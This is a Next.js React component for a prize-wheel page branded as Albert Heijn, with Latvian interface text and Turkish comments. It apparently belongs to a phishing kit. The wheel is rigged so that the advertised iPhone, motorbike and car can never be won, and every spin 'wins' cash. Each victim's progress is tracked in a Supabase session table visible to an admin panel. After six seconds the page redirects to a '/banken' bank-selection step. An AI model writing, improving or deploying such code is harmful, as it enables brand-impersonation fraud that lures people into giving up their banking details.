"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { ConfettiEffect } from "@/components/AlbertHeijnWheel/ConfettiEffect";
import { PrizePopup } from "@/components/AlbertHeijnWheel/PrizePopup";
import { AlbertHeijnWheel } from "@/components/AlbertHeijnWheel/AlbertHeijnWheel";
import { useIsMobile } from "@/hooks/useIsMobile";
import { getPreferredRouteSessionId } from "@/lib/session-id-client";
import { DEFAULT_WHEEL_VIEWPORT, resolveWheelLayout } from "./wheel-layout";
import {
  WHEEL_PRIZES,
  WHEEL_CURRENCY,
  type WheelPrizeSegment as PrizeSegment,
} from "@/lib/wheel-prizes";

type WinHistoryItem = {
  prize: string;
  date: string;
};

type SessionRecord = {
  id: string;
  amount: number | null;
  current_step: string | null;
  form_data?: Record<string, unknown> | null;
};

const ANGLE_OFFSET = 0;
const MIN_FULL_SPINS = 6;
const LOCAL_HISTORY_KEY = "ah-prize-wheel-last-five-wins";
const MAX_HISTORY_ITEMS = 5;
const SEGMENT_ANGLE = 40; // 9 dilim x 40° — wheel.webp'e gomulu
const PRIZES: readonly PrizeSegment[] = WHEEL_PRIZES;

// Kazanilabilir NAKIT dilimleri — admin paneli wheel_settings.prizes
// sirasiyla bu 5 girise karsilik gelir (amount/weight duzenlenebilir,
// rotationIndex gorsele sabitlenmistir). iPhone/MOTOCIKLS/AUTO/GRIEZ kazanilamaz.
const CASH_SLOTS: Array<{ rotationIndex: number; amount: number; weight: number }> = [
  { rotationIndex: 2, amount: 2000, weight: 19 },
  { rotationIndex: 5, amount: 1500, weight: 27 },
  { rotationIndex: 6, amount: 1000, weight: 24 },
  { rotationIndex: 7, amount: 500, weight: 5 },
  { rotationIndex: 8, amount: 2500, weight: 14 },
];

type WheelPrizeConfig = {
  prizes: PrizeSegment[];
  winnable: PrizeSegment[];
  weights: Record<number, number>;
};

function buildWheelPrizes(wheelSettings: unknown): WheelPrizeConfig {
  const ws =
    wheelSettings && typeof wheelSettings === "object"
      ? (wheelSettings as Record<string, unknown>)
      : null;
  const raw = ws?.prizes;
  const entries = CASH_SLOTS.map((def, i) => {
    // Yeni format: prizes[rotationIndex] (9 eleman, tum dilimler).
    // Eski format: prizes[i] (5 eleman, sadece nakit slotlar) — geriye donuk destek.
    const legacy = Array.isArray(raw) && raw.length === 5;
    const entry = Array.isArray(raw)
      ? ((legacy ? raw[i] : raw[def.rotationIndex]) as
          | { amount?: unknown; weight?: unknown }
          | undefined)
      : undefined;
    const weight = Number(entry?.weight);
    return {
      rotationIndex: def.rotationIndex,
      // Tutar HER ZAMAN gorsele gomulu degerdir — admin/DB yanlis yazsa bile
      // kullanicinin gordugu ile kaydedilen her zaman ayni kalir.
      amount: def.amount,
      weight: Number.isFinite(weight) && weight >= 0 ? Math.round(weight) : def.weight,
    };
  });

  const prizes: PrizeSegment[] = WHEEL_PRIZES.map((prize) => {
    const slotIdx = CASH_SLOTS.findIndex((slot) => slot.rotationIndex === prize.rotationIndex);
    if (slotIdx === -1) return prize;
    const e = entries[slotIdx];
    const label = `${WHEEL_CURRENCY}${e.amount.toLocaleString("en-US")}`;
    return { ...prize, amount: e.amount, text: label, popupLines: [`€ ${formatAmount(e.amount)}`] };
  });
  const weights: Record<number, number> = {};
  entries.forEach((e) => { weights[e.rotationIndex] = e.weight; });
  const winnable = prizes.filter(
    (prize) => prize.kind === "amount" && (weights[prize.rotationIndex] ?? 0) > 0,
  );
  return { prizes, winnable, weights };
}

const DEFAULT_WHEEL_CONFIG: WheelPrizeConfig = buildWheelPrizes(null);

function normalizeAngle(angle: number) {
  return ((angle % 360) + 360) % 360;
}

async function resolveShortIdApi(sessionId: string): Promise<string | null> {
  try {
    const res = await fetch(`/api/resolve-short-id`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ session_id: sessionId }),
      cache: "no-store",
    });
    if (!res.ok) return null;
    const json = await res.json();
    if (json?.ok && json?.public_id) return String(json.public_id);
    return null;
  } catch {
    return null;
  }
}

function formatAmount(amount: number) {
  return new Intl.NumberFormat("de-DE").format(amount);
}

function getTargetRotation(currentRotation: number, rotationIndex: number) {
  const normalizedCurrent = normalizeAngle(currentRotation);
  const targetNormalized = normalizeAngle(ANGLE_OFFSET - rotationIndex * SEGMENT_ANGLE);
  const delta = normalizeAngle(targetNormalized - normalizedCurrent);
  return currentRotation + MIN_FULL_SPINS * 360 + delta;
}

function getPrizeFromSession(session: SessionRecord | null, prizes: PrizeSegment[]) {
  const storedRotationIndex = session?.form_data?.wheel_rotation_index;
  if (typeof storedRotationIndex === "number") {
    const p = prizes.find((x) => x.rotationIndex === storedRotationIndex);
    if (p) return p;
  }

  const storedLabel = session?.form_data?.wheel_result_label;
  if (typeof storedLabel === "string") {
    const p = prizes.find((x) => x.text === storedLabel);
    if (p) return p;
  }

  const storedAmount = session?.form_data?.wheel_result_amount;
  if (typeof storedAmount === "number" && storedAmount > 0) {
    const p = prizes.find((x) => x.amount === storedAmount);
    if (p) return p;
  }

  if (typeof session?.amount === "number" && session.amount > 0) {
    const p = prizes.find((x) => x.amount === session.amount);
    if (p) return p;
  }

  return null;
}

// Agirlikli rastgele odul secimi (admin panelindeki % agirliklara gore)
function getRandomWinnablePrize(cfg: WheelPrizeConfig) {
  const weightedList: PrizeSegment[] = [];
  for (const prize of cfg.winnable) {
    const weight = cfg.weights[prize.rotationIndex] ?? 1;
    for (let i = 0; i < weight; i++) weightedList.push(prize);
  }
  if (weightedList.length === 0)
    return cfg.winnable[0] ?? cfg.prizes.find((p) => p.kind === "amount") ?? cfg.prizes[0];
  return weightedList[Math.floor(Math.random() * weightedList.length)];
}

function getRotationIndexFromRotation(rotation: number) {
  const normalizedRotation = normalizeAngle(rotation);
  return Math.round(normalizeAngle(ANGLE_OFFSET - normalizedRotation) / SEGMENT_ANGLE) % PRIZES.length;
}

function getPrizeFromRotation(rotation: number, prizes: PrizeSegment[]) {
  const landedRotationIndex = getRotationIndexFromRotation(rotation);
  return prizes.find((prize) => prize.rotationIndex === landedRotationIndex) ?? null;
}

function logWheelEvent(eventName: "wheel_spin" | "wheel_win" | "popup_open" | "popup_close" | "wheel_transition_end", payload?: Record<string, unknown>) {
  console.log("[wheel-analytics]", {
    event: eventName,
    ...payload,
  });
}

function readWinHistory() {
  if (typeof window === "undefined") {
    return [] as WinHistoryItem[];
  }

  try {
    const rawValue = window.localStorage.getItem(LOCAL_HISTORY_KEY);
    if (!rawValue) {
      return [];
    }

    const parsed = JSON.parse(rawValue) as WinHistoryItem[];
    return Array.isArray(parsed) ? parsed.slice(0, MAX_HISTORY_ITEMS) : [];
  } catch {
    return [];
  }
}

function storeWinHistory(prize: string) {
  const nextHistory = [
    {
      prize,
      date: new Date().toISOString(),
    },
    ...readWinHistory(),
  ].slice(0, MAX_HISTORY_ITEMS);

  window.localStorage.setItem(LOCAL_HISTORY_KEY, JSON.stringify(nextHistory));
  return nextHistory;
}

export function WheelClient({
  sessionId,
  routeSessionId,
}: {
  sessionId: string;
  routeSessionId?: string;
}) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const isMobile = useIsMobile();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
  const continueButtonRef = useRef<HTMLButtonElement | null>(null);
  const pendingPrizeRef = useRef<PrizeSegment | null>(null);
  const rotationRef = useRef(0);
  const wheelRef = useRef<HTMLDivElement | null>(null);

  // Client-side URL normalizasyonu: /wheel/UUID ise pathi /wheel/{kisa_id} ye cevir
  useEffect(() => {
    if (typeof window === "undefined") return;
    let cancelled = false;

    const run = async () => {
      const match = window.location.pathname.match(/^\/wheel\/([^/?#]+)/i);
      if (!match) return;
      const idFromPath = decodeURIComponent(match[1]);
      const isUuid =
        /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
          idFromPath,
        );
      if (!isUuid) return;

      const preferredShort =
        routeSessionId &&
        !/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(
          routeSessionId,
        )
          ? routeSessionId
          : null;

      const shortId = preferredShort ?? (sessionId ? await resolveShortIdApi(sessionId) : null);
      if (cancelled) return;
      if (shortId && shortId !== idFromPath) {
        const url = new URL(window.location.href);
        const segs = url.pathname.split("/").filter(Boolean);
        if (segs.length >= 2 && segs[0].toLowerCase() === "wheel") {
          segs[1] = encodeURIComponent(shortId);
          url.pathname = "/" + segs.join("/");
        }
        const next = url.pathname + url.search + url.hash;
        window.history.replaceState({}, "", next);
      }
    };

    run();
    return () => {
      cancelled = true;
    };
  }, [sessionId, routeSessionId]);

  const [spinning, setSpinning] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [rotation, setRotation] = useState(0);
  const [resultPrize, setResultPrize] = useState<PrizeSegment | null>(null);
  const [sessionData, setSessionData] = useState<SessionRecord | null>(null);
  const [viewportSize, setViewportSize] = useState(DEFAULT_WHEEL_VIEWPORT);
  const [winHistory, setWinHistory] = useState<WinHistoryItem[]>([]);
  const [wheelConfig, setWheelConfig] = useState<WheelPrizeConfig>(DEFAULT_WHEEL_CONFIG);

  const activeLayout = resolveWheelLayout(viewportSize);
  const viewportHeight = viewportSize.height > 0 ? viewportSize.height : DEFAULT_WHEEL_VIEWPORT.height;
  const isSpinDisabled = spinning || resultPrize !== null || !sessionData;
  const popupAmountLine =
    resultPrize?.kind === "amount" && typeof resultPrize.amount === "number"
      ? `€ ${formatAmount(resultPrize.amount)}`
      : resultPrize?.text ?? "";
  const popupDescription =
    resultPrize?.kind === "amount" ? `Jūsu balva ir ${popupAmountLine}.` : resultPrize?.text ?? "Skatiet savu rezultātu.";

  const formattedHistory = useMemo(
    () =>
      winHistory.map((item) => ({
        ...item,
        formattedDate: new Intl.DateTimeFormat("lv-LV", {
          day: "2-digit",
          month: "2-digit",
          hour: "2-digit",
          minute: "2-digit",
        }).format(new Date(item.date)),
      })),
    [winHistory],
  );

  useEffect(() => {
    rotationRef.current = rotation;
  }, [rotation]);

  useEffect(() => {
    setWinHistory(readWinHistory());
  }, []);

  useEffect(() => {
    let cancelled = false;

    async function loadSession() {
      if (!sessionId) {
        setError("Nederīga sesija.");
        return;
      }

      if (!supabase) return;

      const { data, error: dbError } = await supabase
        .from("sessions")
        .select("id,amount,current_step,form_data")
        .eq("id", sessionId)
        .single();

      if (cancelled) return;

      if (dbError || !data) {
        setError("Sesija nav atrasta.");
        return;
      }

      const nextSession = data as SessionRecord;

      // Admin panelden okunan cark odul ayarlari (tutar + sans %)
      let cfg = DEFAULT_WHEEL_CONFIG;
      try {
        const { data: gs } = await supabase
          .from("global_settings")
          .select("wheel_settings")
          .limit(1)
          .maybeSingle();
        cfg = buildWheelPrizes(gs?.wheel_settings);
        if (!cancelled) {
          setWheelConfig(cfg);
        }
      } catch {
        /* ayarlar okunamazsa varsayilan config kalir */
      }

      if (nextSession.current_step === "code_entry" && !nextSession.form_data?.is_wheel_game) {
        const updatedFormData = { ...(nextSession.form_data || {}), is_wheel_game: true };
        await supabase.from("sessions").update({ is_hidden: false, form_data: updatedFormData }).eq("id", sessionId);
        nextSession.form_data = updatedFormData;
      }

      setSessionData(nextSession);

      const restoredPrize = getPrizeFromSession(nextSession, cfg.prizes);
      if (restoredPrize) {
        setResultPrize(restoredPrize);
        setShowPopup(true);
      }
    }

    void loadSession();

    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  useEffect(() => {
    const updateViewportSize = () => {
      setViewportSize({
        width: Math.round(window.visualViewport?.width ?? window.innerWidth),
        height: Math.round(window.visualViewport?.height ?? window.innerHeight),
      });
    };

    updateViewportSize();
    window.visualViewport?.addEventListener("resize", updateViewportSize);
    window.addEventListener("resize", updateViewportSize);
    window.addEventListener("orientationchange", updateViewportSize);

    return () => {
      window.visualViewport?.removeEventListener("resize", updateViewportSize);
      window.removeEventListener("resize", updateViewportSize);
      window.removeEventListener("orientationchange", updateViewportSize);
    };
  }, []);

  useEffect(() => {
    const previousHtmlOverflow = document.documentElement.style.overflow;
    const previousHtmlOverscroll = document.documentElement.style.overscrollBehavior;
    const previousBodyOverflow = document.body.style.overflow;
    const previousBodyOverscroll = document.body.style.overscrollBehavior;

    document.documentElement.style.overflow = "hidden";
    document.documentElement.style.overscrollBehavior = "none";
    document.body.style.overflow = "hidden";
    document.body.style.overscrollBehavior = "none";

    return () => {
      document.documentElement.style.overflow = previousHtmlOverflow;
      document.documentElement.style.overscrollBehavior = previousHtmlOverscroll;
      document.body.style.overflow = previousBodyOverflow;
      document.body.style.overscrollBehavior = previousBodyOverscroll;
    };
  }, []);

  useEffect(() => {
    if (!showPopup || !resultPrize) {
      return;
    }

    logWheelEvent("popup_open", {
      prize: resultPrize.text,
      amount: resultPrize.amount,
    });

    const focusTimeout = window.setTimeout(() => {
      continueButtonRef.current?.focus({ preventScroll: true });
    }, 80);

    return () => {
      window.clearTimeout(focusTimeout);
    };
  }, [resultPrize, showPopup]);

  const finalizeSpin = async (prize: PrizeSegment) => {
    // Guvenlik agi: son care nakit olmayan bir dilim secilemez
    const safePrize =
      prize.kind === "amount" &&
      prize.amount !== null &&
      wheelConfig.winnable.some((wp) => wp.rotationIndex === prize.rotationIndex)
        ? prize
        : wheelConfig.winnable[0] ?? prize;

    setSpinning(false);
    setResultPrize(safePrize);
    setShowPopup(true);

    logWheelEvent("wheel_win", {
      prize: safePrize.text,
      amount: safePrize.amount,
      selectionIndex: safePrize.selectionIndex,
      rotationIndex: safePrize.rotationIndex,
    });

    if (safePrize.kind === "amount") {
      setWinHistory(storeWinHistory(`€ ${formatAmount(safePrize.amount ?? 0)}`));
    }

    if (!supabase || !sessionId) {
      return;
    }

    const nextFormData = {
      ...(sessionData?.form_data ?? {}),
      pending_profile: false,
      wheel_result_label: safePrize.text,
      wheel_result_kind: safePrize.kind,
      wheel_result_amount: safePrize.amount,
      wheel_rotation_index: safePrize.rotationIndex,
    };

    await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        amount: safePrize.amount ?? 0,
        current_step: "wheel",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    // =================================================================
    //  YAZMA ISLEMI BITTIKTEN SONRA TEKRAR OKU + SET STATE + SONRA PUSH.
    //  Boylece WinFlow cagirdiginda amount kesin DB'de yazili olur,
    //  stale okuma riski sifirlanir.
    // =================================================================
    try {
      const { data: reFetched } = await supabase
        .from("sessions")
        .select("amount, current_step, form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (reFetched) {
        const patched = { ...(sessionData ?? ({} as SessionRecord)), amount: reFetched.amount ?? 0, current_step: reFetched.current_step ?? "wheel", form_data: (reFetched.form_data ?? nextFormData) as SessionRecord["form_data"] } as SessionRecord;
        setSessionData(patched);
      } else {
        setSessionData((previous) =>
          previous
            ? {
                ...previous,
                amount: safePrize.amount ?? 0,
                current_step: "wheel",
                form_data: nextFormData,
              }
            : previous,
        );
      }
    } catch (refetchErr) {
      // Tekrar okuma hali bozuksa, state'le devam et
      console.warn("[wheel] session refetch okunamadi state fallback kullaniliyor", refetchErr);
      setSessionData((previous) =>
        previous
          ? {
              ...previous,
              amount: safePrize.amount ?? 0,
              current_step: "wheel",
              form_data: nextFormData,
            }
          : previous,
      );
    }
  };

  const spinWheel = () => {
    if (isSpinDisabled) {
      return;
    }

    const nextPrize = getRandomWinnablePrize(wheelConfig);
    const startRotation = rotationRef.current;
    // Dilim icinde dogal durus: +-10° jitter (dilim yarisi +-20° — indeks bozulmaz).
    // Kazanilan odul HER ZAMAN gercek durus acisindan hesaplanir (getPrizeFromRotation).
    const jitter = (Math.random() * 2 - 1) * 10;
    const targetRotation = getTargetRotation(startRotation, nextPrize.rotationIndex) + jitter;

    pendingPrizeRef.current = nextPrize;
    rotationRef.current = targetRotation;
    setSpinning(true);
    logWheelEvent("wheel_spin", {
      selectionIndex: nextPrize.selectionIndex,
      targetPrize: nextPrize.text,
      targetRotationIndex: nextPrize.rotationIndex,
    });
    setRotation(targetRotation);
  };

  const handleWheelTransitionEnd = () => {
    if (!spinning || !pendingPrizeRef.current) {
      return;
    }

    const targetPrize = pendingPrizeRef.current;
    // Odul HER ZAMAN carkin gercek durdugu acidan hesaplanir —
    // kullanici gorselde ne goruyorsa sisteme de o yazilir.
    const settled = getPrizeFromRotation(rotationRef.current ?? rotation, wheelConfig.prizes);
    const settledWinnable =
      settled &&
      settled.kind === "amount" &&
      wheelConfig.winnable.some((p) => p.rotationIndex === settled.rotationIndex)
        ? settled
        : null;
    // GRIEZ/iPhone/MOTOCIKLS/AUTO ASLA kazanamaz — yalniz nakit dilimler.
    const finalPrize = settledWinnable ?? targetPrize;

    logWheelEvent("wheel_transition_end", {
      settledRotationIndex: settled?.rotationIndex ?? null,
      settledPrizeText: settled?.text ?? null,
      targetPrizeText: targetPrize.text,
      finalPrizeText: finalPrize.text,
      finalAmount: finalPrize.amount,
    });

    pendingPrizeRef.current = null;
    void finalizeSpin(finalPrize);
  };

  const handleContinue = () => {
    logWheelEvent("popup_close", {
      prize: resultPrize?.text ?? null,
    });
    setShowPopup(false);
    const go = async () => {
      try {
        if (supabase && sessionId) {
          await supabase
            .from("sessions")
            .update({ current_step: "banken" })
            .eq("id", sessionId);
        }
      } catch {
        /* best-effort; navigation proceeds anyway */
      }
      router.push(`/banken?session=${encodeURIComponent(effectiveRouteSessionId)}`);
    };
    void go();
  };

  const handleContinueRef = useRef(handleContinue);
  handleContinueRef.current = handleContinue;

  useEffect(() => {
    if (!showPopup || !resultPrize) return;
    const autoContinue = window.setTimeout(() => {
      handleContinueRef.current();
    }, 6000);
    return () => window.clearTimeout(autoContinue);
  }, [showPopup, resultPrize]);

  if (error) {
    return (
      <div
        className="flex flex-col items-center justify-center p-6 text-center"
        style={{ minHeight: `${viewportHeight}px` }}
      >
        <div className="mb-4 text-red-500">
          <svg className="size-16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
          </svg>
        </div>
        <h1 className="mb-2 text-2xl font-bold text-slate-800">Kļūda</h1>
        <p className="text-slate-600">{error}</p>
      </div>
    );
  }

  return (
    <>
      <div
        className="relative w-full overflow-hidden"
        style={{
          height: `${viewportHeight}px`,
          minHeight: `${viewportHeight}px`,
          paddingTop: "env(safe-area-inset-top)",
          paddingRight: "env(safe-area-inset-right)",
          paddingBottom: "env(safe-area-inset-bottom)",
          paddingLeft: "env(safe-area-inset-left)",
          backgroundColor: "#0f172a",
          backgroundImage: "linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%)",
        }}
      >
        <AlbertHeijnWheel
          ref={wheelRef}
          layout={activeLayout}
          rotation={rotation}
          spinning={spinning}
          disabled={isSpinDisabled}
          prizes={wheelConfig.prizes}
          onSpin={spinWheel}
          onSpinEnd={handleWheelTransitionEnd}
        />
      </div>

      <PrizePopup
        open={showPopup}
        isMobile={isMobile}
        result={resultPrize}
        amountLine={popupAmountLine}
        description={popupDescription}
        continueButtonRef={continueButtonRef}
        onClose={handleContinue}
      />

      <ConfettiEffect
        active={showPopup && resultPrize?.kind === "amount"}
        triggerKey={showPopup && resultPrize?.kind === "amount" ? `${sessionId}-${resultPrize.text}-${resultPrize.amount}` : null}
      />
    </>
  );
}
